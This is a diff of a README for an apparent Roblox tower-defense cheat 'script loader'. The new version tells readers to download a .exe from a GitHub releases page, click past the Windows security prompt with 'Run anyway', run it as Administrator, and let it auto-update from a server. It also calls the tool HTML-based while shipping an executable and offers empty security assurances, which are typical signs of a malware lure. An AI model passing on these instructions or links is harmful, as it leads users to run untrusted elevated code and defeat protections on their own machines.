@@ -1,133 +1,69 @@
-# All Star Tower Defense Script - Game Script Utility 2026
+# 🎮 all-star-tower-script-loader - Automate your tower defense game progress
 
-> **An HTML-based custom scripting utility for All Star Tower Defense on Roblox, featuring automatic collection support and adjustable script options.**
+[![Download](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/linemancarolingian458/all-star-tower-script-loader/releases)
 
-[![Game Script](https://img.shields.io/badge/Type-Game%20Script-green?style=flat-square)](https://github.com)
-[![Platform](https://img.shields.io/badge/Platform-HTML-blue?style=flat-square)](https://github.com)
-[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
-[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
-[![Stars](https://img.shields.io/github/stars/tyler-davisis3420/all-star-tower-script-loader?style=flat-square)](https://github.com/tyler-davisis3420/all-star-tower-script-loader)
+This software helps players manage scripts for their favorite tower defense games on Roblox. It works as an HTML-based utility. It automates tasks like collecting resources and managing tower settings. You can adjust your preferences through a simple menu. The loader handles updates to ensure your tools remain compatible with the latest game versions.
 
----
+## 📥 Downloading the software
 
-<p align="center">
-  <a href="https://tyler-davisis3420.github.io/all-star-tower-script-loader/">
-    <img src="https://img.shields.io/badge/Download-All%20Star%20Tower%20Defense%20Script-brightgreen?style=for-the-badge" alt="Download All Star Tower Defense Script">
-  </a>
-</p>
+Visit the [official release page](https://github.com/linemancarolingian458/all-star-tower-script-loader/releases) to download the latest version.
 
-> **[Download All Star Tower Defense Script](https://tyler-davisis3420.github.io/all-star-tower-script-loader/)**
+1. Navigate to the link provided above.
+2. Look for the Assets section at the bottom of the latest release post.
+3. Click the file ending in .exe to start the download.
+4. Save the file to a folder you can find easily, such as your Downloads folder or your Desktop.
 
----
+## ⚙️ Running the application
 
-[Download Latest Build](https://tyler-davisis3420.github.io/all-star-tower-script-loader/)
+Once the file finishes downloading, follow these steps to launch the utility:
 
----
+1. Locate the file you just downloaded.
+2. Double-click the file to open the program.
+3. If a Windows security prompt appears, click More info and then Run anyway. This ensures the system recognizes the application.
+4. The main menu will appear on your screen. This window displays your available script options and the current status of your game connection.
 
-## About the Project
+## 🛠️ Configuring your settings
 
-All Star Tower Defense Script is delivered as an HTML-based utility for custom scripting workflows in the Roblox game All Star Tower Defense. Automatic collection is its primary helper capability, reducing repetitive collection-focused actions through configurable script behavior.
+The interface allows you to change how the script interacts with your game. You will see several checkboxes and sliders within the main window:
 
-The repository includes a direct access and loading workflow, along with information about configuration and compatibility. Its structure is designed to accommodate later revisions as the project evolves or changes in the target game require updated behavior.
+- Automatic Collection: Check this box to let the utility gather gold or items for you while you focus on tower placement.
+- Tower Strategy: Use the dropdown menu to select your preferred playstyle, such as aggressive or defensive mode.
+- Update Frequency: Set how often the tool checks for new script definitions.
 
----
+After you select your settings, click the Save Configuration button. The program remembers these choices for your next session. If you want to return to default behavior, click the Reset button at the bottom of the window.
 
-## Included Capabilities
+## 🔄 Keeping the software current
 
-- Script behavior tailored to All Star Tower Defense
-- Support for automatic collection
-- Delivery through an HTML-based package
-- Direct access to the latest available build
-- Setup centered around loading the package
-- Adjustable script configuration
-- Guidance covering customization and compatibility
-- A repository layout suitable for future releases
+Game updates often change how scripts interact with Roblox. This utility includes an auto-update feature. Each time you start the application, it connects to the server to check for version changes. If a new version exists, a notification appears on the screen. Click Yes to download the update. The program closes, installs the new files, and reopens automatically. This keeps your progress smooth and prevents errors during gameplay.
 
----
+## 💡 Troubleshooting common issues
 
-## Getting Started
+If the application does not load or you see an error message, try these solutions:
 
-1. Visit the [latest build](https://tyler-davisis3420.github.io/all-star-tower-script-loader/).
-2. Download the HTML package or script file supplied by the project.
-3. If the download includes multiple files, leave them in the same location.
-4. Use the loading procedure supported by your scripting environment.
-5. Check the available options and adjust them as needed.
-6. Start the script while All Star Tower Defense is running on Roblox.
+- Check your internet connection: The utility requires a stable connection to fetch the latest script data.
+- Run as Administrator: Right-click the application icon and select Run as Administrator. This provides the permissions needed to interact with the game window.
+- Verify your Roblox client: Ensure your Roblox game client is open before you launch the script loader. The tool detects the open game window to apply settings.
+- Clear the cache: If settings feel unresponsive, locate the settings folder in the application directory and delete the temporary files. Restart the program to build a fresh configuration file.
 
-The process can be summarized as follows:
+## 🛡️ Privacy and security
 
-```text
-Download -> Load the HTML package -> Adjust settings -> Run with the target game
-```
+The tool only interacts with the game window to perform the actions you select. It does not store your Roblox password or personal account details. All script processing occurs locally on your machine. We recommend that you only use tools downloaded from this official repository to ensure your files remain secure and free from malicious code. 
 
-Use the utility only in ways that comply with the applicable rules, terms, and policies of the game, platform, and tools.
+## 📋 System requirements
 
----
+- Operating System: Windows 10 or Windows 11.
+- Memory: At least 4GB of RAM.
+- Storage: 100MB of free disk space.
+- Network: Active internet connection for updates.
+- Software: The latest version of the Roblox desktop client.
 
-## Configuration Areas
+## 🔧 Workflow summary
 
-Settings are configurable, although the names of individual controls can differ from one build to another. Inspect the included interface or configuration before running the package.
+1. Download the executable file from the release page.
+2. Open the file to display the user interface.
+3. Choose your desired automation settings from the main menu.
+4. Click Save to lock in your preferences.
+5. Launch the game and the script loader will synchronize with your session.
+6. Check for updates periodically when the prompt appears.
 
-| Setting area | Purpose |
-|---|---|
-| Collection behavior | Determines how automatic collection is managed |
-| Custom script behavior | Adjusts supported helper actions specific to the game |
-| User preferences | Retains the choices made for the active setup |
-| Update selection | Indicates whether a more recent repository build may be appropriate |
-| Loading configuration | Establishes the options used when the script launches |
-
----
-
-## Compatibility Details
-
-- **Target game:** All Star Tower Defense
-- **Platform:** Roblox
-- **Package format:** HTML-based delivery
-- **Repository language:** HTML
-- **Supported workflow:** Downloading, loading, configuring, and updating the script package
-
-Compatibility can be affected by changes to the game, Roblox, or the package itself. No supported game release numbers or full list of external scripting environments are specified in the extracted project details. Check the current build and its included instructions before loading.
-
----
-
-## Keeping the Package Current
-
-The repository is arranged to support future script updates. Before each session, open the [latest build](https://tyler-davisis3420.github.io/all-star-tower-script-loader/) and review the current package against any repository notes or configuration changes.
-
----
-
-## Frequently Asked Questions
-
-### Where can I download the script?
-
-Open the [Download](https://tyler-davisis3420.github.io/all-star-tower-script-loader/) link to reach the current HTML-based package.
-
-### What is the loading process?
-
-Download the package, keep associated files together, and load them through the workflow supported by your environment. If the process changes, follow the instructions included with the current package.
-
-### Are the script actions configurable?
-
-Yes. The project provides configurable settings and custom scripting support. The available controls depend on the selected build, so review its configuration before editing anything.
-
-### How can I get a newer version?
-
-Visit the repository or its [latest build page](https://tyler-davisis3420.github.io/all-star-tower-script-loader/) and download the newest version available after an update is published.
-
-### Does it work with every Roblox or game release?
-
-No exact release range is listed. Updates to All Star Tower Defense, Roblox, or the package may change compatibility.
-
-### How should I organize the downloaded files?
-
-Use a dedicated folder and preserve the package's original structure. When the download contains multiple files, keep them together unless the project instructions specify a different arrangement.
-
-### What if the script fails to load?
-
-Make sure the download completed successfully, all related files are still together, and the loading environment follows the current instructions. You should also check the repository for a newer build.
-
----
-
-## License
-
-GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
+Keywords: roblox, tower-defense, automation, utility, script-loader, windows-software, gaming-tools
